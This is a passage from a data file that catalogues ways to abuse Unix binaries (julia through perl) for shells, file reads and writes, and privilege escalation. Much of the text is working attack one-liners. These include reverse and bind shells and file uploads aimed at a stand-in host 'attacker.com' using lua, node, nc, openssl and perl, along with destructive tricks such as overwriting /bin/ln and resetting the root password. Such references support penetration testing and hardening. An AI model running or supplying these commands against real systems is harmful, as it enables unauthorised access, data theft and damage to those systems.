    "shell": [{"code": "julia -e 'run(`/bin/sh`)'", "suid_code": "julia -e 'run(`/bin/sh -p`)'"}]
  },
  "knife": {
    name: "knife",
    functions: ["inherit"],
    "inherit": [{"code": "knife exec -E '...'", "comment": "This allows to run Ruby code (`...`)."}]
  },
  "ksshell": {
    name: "ksshell",
    functions: ["file-read"],
    "file-read": [{"code": "ksshell -i /path/to/input-file", "comment": "Each line is corrupted by a prefix string. Also consider that lines are actually parsed as `kickstart` scripts thus some file contents may lead to unexpected results."}]
  },
  "ksu": {
    name: "ksu",
    functions: ["shell"],
    "shell": [{"code": "ksu -q -e /bin/sh"}]
  },
  "kubectl": {
    name: "kubectl",
    functions: ["shell", "upload"],
    "shell": [{"code": "cat >/path/to/temp-file <<EOF\nclusters:\n- cluster:\n    server: https://x\n  name: x\ncontexts:\n- context:\n    cluster: x\n    user: x\n  name: x\ncurrent-context: x\nusers:\n- name: x\n  user:\n    exec:\n      apiVersion: client.authentication.k8s.io/v1\n      interactiveMode: Always\n      command: /bin/sh\n      args:\n        - '-c'\n        - '/bin/sh 0<&2 1>&2'\nEOF\n\nkubectl get pods --kubeconfig=/path/to/temp-file", "comment": "The shell is spawn multiple times."}],
    "upload": [{"code": "kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/"}]
  },
  "last": {
    name: "last",
    functions: ["file-read"],
    "file-read": [{"code": "last -a -f /path/to/input-file", "comment": "The output might be corrupted or incomplete if the file does not follow the expected database format."}]
  },
  "latex": {
    name: "latex",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/path/to/input-file}\\end{document}'\nstrings texput.dvi", "comment": "The read file will be part of the PDF output."}],
    "file-write": [{"code": "latex '\\documentclass{article}\\newwrite\\tempfile\\begin{document}\\immediate\\openout\\tempfile=output-file.tex\\immediate\\write\\tempfile{DATA}\\immediate\\closeout\\tempfile\\end{document}'", "comment": "The file can only be written in the current directory, and the `.tex` extension is mandatory."}],
    "shell": [{"code": "latex --shell-escape '\\immediate\\write18{/bin/sh}'"}]
  },
  "latexmk": {
    name: "latexmk",
    functions: ["file-read", "inherit", "shell"],
    "file-read": [{"code": "echo '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/path/to/input-file}\\end{document}' >/path/to/temp-file\nlatexmk -dvi /path/to/temp-file\nstrings temp-file.dvi", "comment": "The read file will be part of the output."}],
    "inherit": [{"code": "latexmk -e '...'", "comment": "This allows to run Perl code (`...`)."}],
    "shell": [{"code": "latexmk -pdf -pdflatex='/bin/sh #' /dev/null"}]
  },
  "ldconfig": {
    name: "ldconfig",
    functions: ["library-load"],
    "library-load": [{"code": "echo /path/to/temp-dir/ >/path/to/temp-file\nldconfig -f /path/to/temp-file\nping", "comment": "This allows to override one or more shared libraries (e.g., `libpcap`) globally, then triggers the execution by running a program that uses it, e.g., `ping`. This is particularly useful if the target binary is SUID. Beware though that it is easy to end up with a broken target system.\n\nFirst identify the shared libraries used by the target program, for example:\n\n```\n$ ldd /bin/ping | grep libcap\n        libcap.so.2 => /path/to/temp-dir/libcap.so.2 (0x00007f8417eef000)\n```\n\nThen create the shared library override, named `libcap.so.2`, and put in in `/path/to/temp-dir/`. The program might require some exported symbols from the library override, in that case make sure to add them (e.g., `void cap_get_flag() {}`)."}]
  },
  "less": {
    name: "less",
    functions: ["command", "file-read", "file-write", "inherit", "shell"],
    "command": [{"code": "cp /path/to/command ~/.lessfilter\nless /etc/hosts"}, {"code": "LESSOPEN='/path/to/command # %s' less /etc/hosts"}],
    "file-read": [{"code": "less /path/to/input-file"}, {"code": "less /etc/hosts\n:e /path/to/input-file", "comment": "This can be used to read another file, e.g., when invoked as a pager with some fixed content."}, {"code": "LESSOPEN='echo /path/to/input-file # %s' less /etc/hosts", "comment": "This can be used to read another file."}],
    "file-write": [{"code": "echo DATA | less\ns/path/to/output-file\nq"}],
    "inherit": [{"code": "less /etc/hosts\nv"}],
    "shell": [{"code": "less /etc/hosts\n!/bin/sh"}, {"code": "LESSOPEN=\"/bin/sh -s 1>&0 2>&0 # %s\" less /etc/hosts\nreset", "comment": "The optional `reset` command is needed to receive the echo back of the typed keystrokes."}, {"code": "VISUAL='/bin/sh -s --' less /etc/hosts\nv"}]
  },
  "lftp": {
    name: "lftp",
    functions: ["shell"],
    "shell": [{"code": "lftp -c '!/bin/sh'"}]
  },
  "links": {
    name: "links",
    functions: ["file-read"],
    "file-read": [{"code": "links /path/to/input-file", "comment": "The result is displayed in a TUI interface."}]
  },
  "ln": {
    name: "ln",
    functions: ["privilege-escalation"],
    "privilege-escalation": [{"code": "ln -fs /bin/sh /bin/ln\nln", "comment": "This overrides `ln` itself with a symlink to a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `ln` by path. Warning, this is a destructive action."}]
  },
  "loginctl": {
    name: "loginctl",
    functions: ["shell"],
    "shell": [{"code": "loginctl user-status\n!/bin/sh"}]
  },
  "logrotate": {
    name: "logrotate",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "logrotate /path/to/input-file", "comment": "The first word is returned in a error message."}],
    "file-write": [{"code": "logrotate -l /path/to/output-file DATA", "comment": "The content is written in a log file."}],
    "shell": [{"code": "echo -e '/path/to/temp-file.config {\\nmail x@x.x\\n}' >/path/to/temp-file.config\necho '/bin/sh 0<&2 1>&2' >/path/to/temp-file.sh\nlogrotate -m /path/to/temp-file.sh -f /path/to/temp-file", "comment": "This command is picky about file permissions. An existing config file can be used as weel, provided that it contains a mail directive."}]
  },
  "logsave": {
    name: "logsave",
    functions: ["shell"],
    "shell": [{"code": "logsave /dev/null /bin/sh -i", "suid_code": "logsave /dev/null /bin/sh -i -p"}]
  },
  "look": {
    name: "look",
    functions: ["file-read"],
    "file-read": [{"code": "look '' /path/to/input-file"}]
  },
  "lp": {
    name: "lp",
    functions: ["upload"],
    "upload": [{"code": "lp /path/to/input-file -h attacker.com", "comment": "This requires `cups` to be installed. Run the following on the attacker box beforehand:\n\n1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer;\n2. `lpadmin -d printer` to set the new printer as default;\n3. `cupsctl --remote-any` to enable printing from the Internet."}]
  },
  "ltrace": {
    name: "ltrace",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "ltrace -F /path/to/input-file /dev/null", "comment": "The file is parsed as a configuration file and its content is shown as error messages."}],
    "file-write": [{"code": "ltrace -s 999 -o /path/to/input-file ltrace -F DATA", "comment": "The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough instead of `999`. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F DATA`."}],
    "shell": [{"code": "ltrace -b -L /bin/sh"}]
  },
  "lua": {
    name: "lua",
    functions: ["bind-shell", "download", "file-read", "file-write", "reverse-shell", "shell", "upload"],
    "bind-shell": [{"code": "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",12345));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'", "comment": "This requires `lua-socket` to be available."}],
    "download": [{"code": "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",12345));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"/path/to/output-file\", \"wb\");\n  f:write(d);\n  io.close(f);'", "comment": "This requires `lua-socket` to be available."}],
    "file-read": [{"code": "lua -e 'local f=io.open(\"/path/to/input-file\", \"rb\"); io.write(f:read(\"*a\")); io.close(f);'"}],
    "file-write": [{"code": "lua -e 'local f=io.open(\"/path/to/output-file\", \"wb\"); f:write(\"DATA\"); io.close(f);'"}],
    "reverse-shell": [{"code": "lua -e '\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"attacker.com\",12345);\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'", "comment": "This requires `lua-socket` to be available."}],
    "shell": [{"code": "lua -e 'os.execute(\"/bin/sh\")'"}],
    "upload": [{"code": "lua -e '\n  local f=io.open(\"/path/to/input-file\", \"rb\")\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"attacker.com\",12345);\n  t:send(d);\n  t:close();'", "comment": "This requires `lua-socket` to be available."}]
  },
  "lualatex": {
    name: "lualatex",
    functions: ["inherit"],
    "inherit": [{"code": "lualatex -shell-escape '\\directlua{...}\\end'", "comment": "This allows to run Lua code (`...`)."}]
  },
  "luatex": {
    name: "luatex",
    functions: ["inherit"],
    "inherit": [{"code": "luatex -shell-escape '\\directlua{...}\\end'", "comment": "This allows to run Lua code (`...`)."}]
  },
  "lwp-download": {
    name: "lwp-download",
    functions: ["download", "file-read", "file-write"],
    "download": [{"code": "lwp-download http://attacker.com/path/to/input-file /path/to/output-file", "comment": "The destination file `/path/to/output-file` can be omitted, in that case the file is saved to `input-file` in the current working directory."}],
    "file-read": [{"code": "lwp-download file:///path/to/input-file /dev/stdout"}],
    "file-write": [{"code": "echo DATA >/path/to/temp-file\nlwp-download file:///path/to/temp-file /path/to/output-file"}, {"code": "lwp-download file:///path/to/input-file /path/to/output-file", "comment": "This actually copies a file to a destination."}]
  },
  "lwp-request": {
    name: "lwp-request",
    functions: ["file-read"],
    "file-read": [{"code": "lwp-request file:///path/to/input-file"}]
  },
  "lxd": {
    name: "lxd",
    functions: ["shell"],
    "shell": [{"code": "lxc init ubuntu:16.04 x -c security.privileged=true\nlxc config device add x x disk source=/ path=/mnt/ recursive=true\nlxc start x\nlxc exec x /bin/sh", "comment": "The image (e.g., `ubuntu:16.04`) must be present already, otherwise it will be downloaded."}, {"code": "lxc image import ./alpine*.tar.gz --alias x\nlxc init x x -c security.privileged=true\nlxc config device add x x disk source=/ path=/mnt/ recursive=true\nlxc start x\nlxc exec x /bin/sh", "comment": "This requires steps to be run offline, then the resulting image must be uploaded to target. Build the local image with [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder):\n\n```\ngit clone https://github.com/saghul/lxd-alpine-builder\ncd lxd-alpine-builder\nsudo ./build-alpine -a i686\n```"}]
  },
  "m4": {
    name: "m4",
    functions: ["command", "file-read", "shell"],
    "command": [{"code": "echo 'esyscmd(/path/to/command)' | m4"}],
    "file-read": [{"code": "m4 /path/to/input-file"}],
    "shell": [{"code": "echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4"}]
  },
  "mail": {
    name: "mail",
    functions: ["shell"],
    "shell": [{"code": "mail --exec='!/bin/sh'"}, {"code": "mail -f /etc/hosts\n!/bin/sh"}]
  },
  "make": {
    name: "make",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' ."}],
    "file-write": [{"code": "make -s --eval='$(file >/path/to/output-file,DATA)' ."}],
    "shell": [{"code": "make --eval='$(shell /bin/sh 1>&0)' ."}]
  },
  "man": {
    name: "man",
    functions: ["file-read", "inherit", "shell"],
    "file-read": [{"code": "man /path/to/input-file", "comment": "The file is shown somehow formatted and displayed in the default pager."}],
    "inherit": [{"code": "man man"}],
    "shell": [{"code": "man '-H/bin/sh #' man", "comment": "This requires GNU `troff` (`groff`) to be installed."}]
  },
  "mawk": {
    name: "mawk",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "mawk '//' /path/to/input-file"}],
    "file-write": [{"code": "mawk 'BEGIN { print \"DATA\" > \"/path/to/output-file\" }'"}],
    "shell": [{"code": "mawk 'BEGIN {system(\"/bin/sh\")}'"}]
  },
  "minicom": {
    name: "minicom",
    functions: ["shell"],
    "shell": [{"code": "minicom -D /dev/null", "comment": "Start the following command to open the TUI interface, then:\n\n1. press `Ctrl-A o` and select `Filenames and paths`;\n2. press `e`, type `/bin/sh`, then `Enter`;\n3. Press `Esc` twice;\n4. Press `Ctrl-A k` to drop the shell.\n\nAfter the shell, exit with `Ctrl-A x`.", "suid_comment": "Start the following command to open the TUI interface, then:\n\n1. press `Ctrl-A o` and select `Filenames and paths`;\n2. press `e`, type `/bin/sh -p`, then `Enter`;\n3. Press `Esc` twice;\n4. Press `Ctrl-A k` to drop the shell.\n\nAfter the shell, exit with `Ctrl-A x`."}, {"code": "echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >/path/to/temp-file\nminicom -D /dev/null -S /path/to/temp-file\nreset^J", "comment": "After the shell, exit with `Ctrl-A x`."}]
  },
  "more": {
    name: "more",
    functions: ["file-read", "shell"],
    "file-read": [{"code": "more /path/to/input-file", "comment": "The file is displayed in the terminal interface."}],
    "shell": [{"code": "more /etc/hosts\n!/bin/sh"}]
  },
  "mosh-server": {
    name: "mosh-server",
    functions: ["shell"],
    "shell": [{"code": "mosh --server=mosh-server localhost /bin/sh", "comment": "This requires a valid SSH access.", "sudo_comment": "The `mosh-server` is executed via `sudo`."}]
  },
  "mosquitto": {
    name: "mosquitto",
    functions: ["file-read"],
    "file-read": [{"code": "mosquitto -c /path/to/input-file", "comment": "The file is actually parsed and the first wrong line (ending with a newline or a null character) is returned in an error message."}]
  },
  "mount": {
    name: "mount",
    functions: ["privilege-escalation"],
    "privilege-escalation": [{"code": "mount -o bind /bin/sh /bin/mount\nmount", "comment": "This overrides `mount` itself with a shell (or any other executable)."}]
  },
  "msfconsole": {
    name: "msfconsole",
    functions: ["inherit"],
    "inherit": [{"code": "msfconsole\nirb"}]
  },
  "msgattrib": {
    name: "msgattrib",
    functions: ["file-read"],
    "file-read": [{"code": "msgattrib -P /path/to/input-file", "comment": "The file is parsed and displayed as a Java `.properties` file."}]
  },
  "msgcat": {
    name: "msgcat",
    functions: ["file-read"],
    "file-read": [{"code": "msgcat -P /path/to/input-file", "comment": "The file is parsed and displayed as a Java `.properties` file."}]
  },
  "msgconv": {
    name: "msgconv",
    functions: ["file-read"],
    "file-read": [{"code": "msgconv -P /path/to/input-file", "comment": "The file is parsed and displayed as a Java `.properties` file."}]
  },
  "msgfilter": {
    name: "msgfilter",
    functions: ["file-read", "shell"],
    "file-read": [{"code": "msgfilter -P -i /path/to/input-file /bin/cat", "comment": "The file is parsed and displayed as a Java `.properties` file. `/bin/cat` can be replaced with any other *filter* program."}],
    "shell": [{"code": "echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'", "comment": "The `kill` command is needed to spawn the shell only once. Instead of readinf from standard input, it can read files passed via the `-i` option.", "suid_code": "echo x | msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'"}]
  },
  "msgmerge": {
    name: "msgmerge",
    functions: ["file-read"],
    "file-read": [{"code": "msgmerge -P /path/to/input-file /dev/null", "comment": "The file is parsed and displayed as a Java `.properties` file."}]
  },
  "msguniq": {
    name: "msguniq",
    functions: ["file-read"],
    "file-read": [{"code": "msguniq -P /path/to/input-file", "comment": "The file is parsed and displayed as a Java `.properties` file."}]
  },
  "mtr": {
    name: "mtr",
    functions: ["file-read"],
    "file-read": [{"code": "mtr --raw -F /path/to/input-file", "comment": "The file is actually parsed, thus the content is corrupted by error prints."}]
  },
  "multitime": {
    name: "multitime",
    functions: ["shell"],
    "shell": [{"code": "multitime /bin/sh", "suid_code": "multitime /bin/sh -p"}]
  },
  "mutt": {
    name: "mutt",
    functions: ["file-read"],
    "file-read": [{"code": "mutt -F /path/to/input-file", "comment": "The file is leaked as error messages."}]
  },
  "mv": {
    name: "mv",
    functions: ["file-write", "privilege-escalation"],
    "file-write": [{"code": "echo DATA >/path/to/temp-file\nmv /path/to/temp-file /path/to/output-file"}],
    "privilege-escalation": [{"code": "mv /path/to/input-file /path/to/output-file", "comment": "This can be used to move and then read or write files from a restricted file systems or with elevated privileges."}]
  },
  "mypy": {
    name: "mypy",
    functions: ["file-read", "file-write"],
    "file-read": [{"code": "mypy /path/to/input-file", "comment": "Partial content is leaked as error messages."}],
    "file-write": [{"code": "mypy /path/to/input-file --junit-xml /path/to/output-file", "comment": "Partial content is leaked as error messages inside some XML tags."}]
  },
  "mysql": {
    name: "mysql",
    functions: ["library-load", "shell"],
    "library-load": [{"code": "mysql --default-auth ../../../../../path/to/lib", "comment": "The following loads the `/path/to/lib.so` shared object."}],
    "shell": [{"code": "mysql -e '\\! /bin/sh'"}]
  },
  "nano": {
    name: "nano",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "nano /path/to/input-file", "comment": "The file content is displayed in the terminal interface."}],
    "file-write": [{"code": "nano /path/to/output-file\nDATA\n^O"}],
    "shell": [{"code": "nano\n^R^X\nreset; sh 1>&0 2>&0"}, {"code": "nano -s /bin/sh\n/bin/sh\n^T^T", "comment": "The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.", "suid_code": "nano -s '/bin/sh -p'\n/bin/sh -p\n^T^T"}]
  },
  "nasm": {
    name: "nasm",
    functions: ["file-read"],
    "file-read": [{"code": "nasm -@ /path/to/input-file", "comment": "The file content is treated as command line options and disclosed throught error messages."}]
  },
  "nc": {
    name: "nc",
    functions: ["bind-shell", "download", "reverse-shell", "upload"],
    "bind-shell": [{"code": "nc -l -p 12345 -e /bin/sh", "comment": "This only works with netcat traditional."}],
    "download": [{"code": "nc -l -p 12345 >/path/to/output-file", "comment": "The file is actually written by the invoking shell."}, {"code": "nc attacker.com 12345 >/path/to/output-file", "comment": "The file is actually written by the invoking shell."}],
    "reverse-shell": [{"code": "nc -e /bin/sh attacker.com 12345", "comment": "This only works with netcat traditional."}],
    "upload": [{"code": "nc -l -p 12345 </path/to/input-file", "comment": "The file is actually read by the invoking shell."}, {"code": "nc attacker.com 12345 </path/to/input-file", "comment": "The file is actually read by the invoking shell."}]
  },
  "ncdu": {
    name: "ncdu",
    functions: ["shell"],
    "shell": [{"code": "ncdu\nb"}]
  },
  "ncftp": {
    name: "ncftp",
    functions: ["shell"],
    "shell": [{"code": "ncftp\n!/bin/sh", "suid_code": "ncftp\n!/bin/sh -p"}]
  },
  "needrestart": {
    name: "needrestart",
    functions: ["inherit"],
    "inherit": [{"code": "echo '...' >/path/to/temp-file\nneedrestart -c /path/to/temp-file", "comment": "This allows to run Perl code (`...`)."}]
  },
  "neofetch": {
    name: "neofetch",
    functions: ["file-read", "shell"],
    "file-read": [{"code": "neofetch --ascii /path/to/input-file", "comment": "The file content is used as the logo while some other information is displayed on its right."}],
    "shell": [{"code": "echo 'exec /bin/sh' >/path/to/temp-file\nneofetch --config /path/to/temp-file"}]
  },
  "nft": {
    name: "nft",
    functions: ["file-read"],
    "file-read": [{"code": "nft -f /path/to/input-file", "comment": "The content is actually parsed and corrupted by the command."}]
  },
  "nginx": {
    name: "nginx",
    functions: ["download", "library-load", "upload"],
    "download": [{"code": "cat >/path/to/temp-file <<EOF\nuser root;\nhttp {\n  server {\n    listen 80;\n    root /;\n    autoindex on;\n    dav_methods PUT;\n  }\n}\nevents {}\nEOF\n\nnginx -c /path/to/temp-file"}],
    "library-load": [{"code": "cat >/path/to/temp-file <<EOF\nload_module /path/to/lib.so\nEOF\n\nnginx -t -c /path/to/temp-file", "comment": "Alternatively, the `ssl_engine` directive can be used."}],
    "upload": [{"code": "cat >/path/to/temp-file <<EOF\nuser root;\nhttp {\n  server {\n    listen 80;\n    root /;\n    autoindex on;\n    dav_methods PUT;\n  }\n}\nevents {}\nEOF\n\nnginx -c /path/to/temp-file"}]
  },
  "nice": {
    name: "nice",
    functions: ["shell"],
    "shell": [{"code": "nice /bin/sh", "suid_code": "nice /bin/sh -p"}]
  },
  "nl": {
    name: "nl",
    functions: ["file-read"],
    "file-read": [{"code": "nl -bn -w1 -s '' /path/to/input-file", "comment": "The read file content is corrupted by a leading space added to each line."}]
  },
  "nm": {
    name: "nm",
    functions: ["file-read"],
    "file-read": [{"code": "nm /path/to/input-file", "comment": "The file content is treated as command line options and disclosed through error messages."}]
  },
  "nmap": {
    name: "nmap",
    functions: ["file-read", "file-write", "inherit", "shell"],
    "file-read": [{"code": "nmap -iL /path/to/input-file", "comment": "The file is actually parsed as a list of hosts/networks, lines are leaked through error messages."}],
    "file-write": [{"code": "nmap -oG=/path/to/output-file DATA", "comment": "The payload appears inside the regular nmap output."}],
    "inherit": [{"code": "echo '...' >/path/to/temp-file\nnmap --script=/path/to/temp-file", "comment": "This allows to run Lua code (`...`)."}],
    "shell": [{"code": "nmap --interactive\n!/bin/sh"}]
  },
  "node": {
    name: "node",
    functions: ["bind-shell", "download", "file-read", "file-write", "reverse-shell", "shell", "upload"],
    "bind-shell": [{"code": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(12345)'", "suid_code": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"]);\nrequire(\"net\").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(12345)'"}],
    "download": [{"code": "node -e 'require(\"http\").get(\"http://attacker.com/path/to/input-file\", res => res.pipe(require(\"fs\").createWriteStream(\"/path/to/output-file\")))'"}],
    "file-read": [{"code": "node -e 'process.stdout.write(require(\"fs\").readFileSync(\"/path/to/input-file\"))'"}],
    "file-write": [{"code": "node -e 'require(\"fs\").writeFileSync(\"/path/to/output-file\", \"DATA\")'"}],
    "reverse-shell": [{"code": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").connect(12345, \"attacker.com\", function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n})'", "suid_code": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"]);\nrequire(\"net\").connect(12345, \"attacker.com\", function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n})'"}],
    "shell": [{"code": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'", "suid_code": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'"}],
    "upload": [{"code": "node -e 'require(\"fs\").createReadStream(\"/path/to/input-file\").pipe(require(\"http\").request(\"http://attacker.com/path/to/output-file\"))'"}]
  },
  "nohup": {
    name: "nohup",
    functions: ["command", "shell"],
    "command": [{"code": "nohup /path/to/command\ncat nohup.out", "comment": "The `nohup.out` file contains the standard output and error of the command."}],
    "shell": [{"code": "nohup /bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'", "comment": "This creates a `nohup.out` file in the current working directory.", "suid_code": "nohup /bin/sh -p -c '/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty'"}]
  },
  "npm": {
    name: "npm",
    functions: ["shell"],
    "shell": [{"code": "npm exec /bin/sh"}, {"code": "echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' >package.json\nnpm -C . i"}, {"code": "echo '{\"scripts\": {\"xxx\": \"/bin/sh\"}}' >package.json\nnpm -C . run xxx"}]
  },
  "nroff": {
    name: "nroff",
    functions: ["file-read", "shell"],
    "file-read": [{"code": "nroff /path/to/input-file", "comment": "The file is typeset and some warning messages may appear."}],
    "shell": [{"code": "echo /bin/sh >groff\nchmod +x groff\nGROFF_BIN_PATH=. nroff"}]
  },
  "nsenter": {
    name: "nsenter",
    functions: ["shell"],
    "shell": [{"code": "nsenter /bin/sh", "comment": "The shell command can be omitted.", "suid_code": "nsenter /bin/sh -p"}]
  },
  "ntpdate": {
    name: "ntpdate",
    functions: ["file-read"],
    "file-read": [{"code": "ntpdate -a x -k /path/to/input-file -d localhost", "comment": "The file is actually parsed and lines are leaked through error messages."}]
  },
  "octave": {
    name: "octave",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "octave-cli --eval 'format none; fid = fopen(\"/path/to/input-file\"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'"}],
    "file-write": [{"code": "octave-cli --eval 'fid = fopen(\"/path/to/output-file\", \"w\"); fputs(fid, \"DATA\"); fclose(fid);'"}],
    "shell": [{"code": "octave-cli --eval 'system(\"/bin/sh\")'"}]
  },
  "od": {
    name: "od",
    functions: ["file-read"],
    "file-read": [{"code": "od -An -c -w999 /path/to/input-file", "comment": "Three spaces are added before each character in the read file (wrapped at the specified value, i.e., `999`), and non-printable chars are printed as backslash escape sequences."}]
  },
  "opencode": {
    name: "opencode",
    functions: ["command", "inherit"],
    "command": [{"code": "opencode\n! /path/to/command"}],
    "inherit": [{"code": "opencode db '...'", "comment": "This allows to run SQLite queries (`...`) provided that `sqlite3` is installed."}]
  },
  "openssl": {
    name: "openssl",
    functions: ["download", "file-read", "file-write", "library-load", "reverse-shell", "upload"],
    "download": [{"code": "openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file"}],
    "file-read": [{"code": "openssl enc -in /path/to/input-file"}],
    "file-write": [{"code": "echo DATA | openssl enc -out /path/to/output-file"}, {"code": "openssl enc -in /path/to/input-file -out /path/to/output-file"}],
    "library-load": [{"code": "openssl req -engine ./lib.so"}],
    "reverse-shell": [{"code": "mkfifo /path/to/temp-socket\n/bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket", "comment": "The shell process is not spawn by `openssl`."}],
    "upload": [{"code": "openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file"}]
  },
  "openvpn": {
    name: "openvpn",
    functions: ["file-read", "shell"],
    "file-read": [{"code": "openvpn --config /path/to/input-file", "comment": "The file is actually parsed and the first partial wrong line is returned in an error message."}],
    "shell": [{"code": "openvpn --dev null --script-security 2 --up '/bin/sh -s'", "suid_code": "openvpn --dev null --script-security 2 --up '/bin/sh -p -s'"}]
  },
  "openvt": {
    name: "openvt",
    functions: ["command"],
    "command": [{"code": "openvt -- /path/to/command", "comment": "The command execution is displayed on the virtual console."}]
  },
  "opkg": {
    name: "opkg",
    functions: ["shell"],
    "shell": [{"code": "rpm opkg install x_1.0_all.deb", "comment": "Generate the Debian package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\necho 'exec /bin/sh' >x.sh\nfpm -n x -s dir -t deb -a all --before-install x.sh .\n```"}]
  },
  "pandoc": {
    name: "pandoc",
    functions: ["file-read", "file-write", "inherit"],
    "file-read": [{"code": "pandoc -t plain /path/to/input-file"}],
    "file-write": [{"code": "echo DATA | pandoc -t plain -o /path/to/output-file"}],
    "inherit": [{"code": "echo '...' >/path/to/temp-file\npandoc -L /path/to/temp-file /dev/null", "comment": "This allows to run Lua code (`...`)."}]
  },
  "passwd": {
    name: "passwd",
    functions: ["privilege-escalation"],
    "privilege-escalation": [{"code": "echo -e 'x\\nx' | passwd", "comment": "This changes the root password to `x`, so it's now possible to log in using, for example, `su`."}]
  },
  "paste": {
    name: "paste",
    functions: ["file-read"],
    "file-read": [{"code": "paste /path/to/input-file"}]
  },
  "pax": {
    name: "pax",
    functions: ["file-read"],
    "file-read": [{"code": "pax -w /path/to/input-file | tar -xO"}]
  },
  "pdb": {
    name: "pdb",
    functions: ["inherit"],
    "inherit": [{"code": "echo '...' >/path/to/temp-file\npdb /path/to/temp-file\ncont", "comment": "This allows to run Python code (`...`)."}]
  },
  "pdflatex": {
    name: "pdflatex",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/path/to/input-file}\\end{document}'\npdftotext texput.pdf -", "comment": "The read file will be part of the PDF output."}],
    "file-write": [{"code": "pdflatex '\\documentclass{article}\\newwrite\\tempfile\\begin{document}\\immediate\\openout\\tempfile=output-file.tex\\immediate\\write\\tempfile{DATA}\\immediate\\closeout\\tempfile\\end{document}'", "comment": "The file can only be written in the current directory, and the `.tex` extension is mandatory."}],
    "shell": [{"code": "pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"}]
  },
  "pdftex": {
    name: "pdftex",
    functions: ["shell"],
    "shell": [{"code": "pdftex --shell-escape '\\write18{/bin/sh}\\end'"}]
  },
  "perf": {
    name: "perf",
    functions: ["shell"],
    "shell": [{"code": "perf stat /bin/sh", "suid_code": "perf stat /bin/sh -p"}]
  },
  "perl": {
    name: "perl",
    functions: ["download", "file-read", "reverse-shell", "shell", "upload"],
    "download": [{"code": "perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>\"attacker.com\",PeerPort=>80,Proto=>\"tcp\") or die; print $s \"GET /path/to/input-file HTTP/1.1\\r\\nHost: attacker.com\\r\\nMetadata: true\\r\\nConnection: close\\r\\n\\r\\n\"; open(my $fh, \">\", \"/path/to/output-file\") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq \"\\r\\n\") { $in_content = 1; } } close($s); close($fh);'"}],
    "file-read": [{"code": "perl -ne print /path/to/input-file"}],
    "reverse-shell": [{"code": "perl -e 'use Socket;$i=\"attacker.com\";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"}],
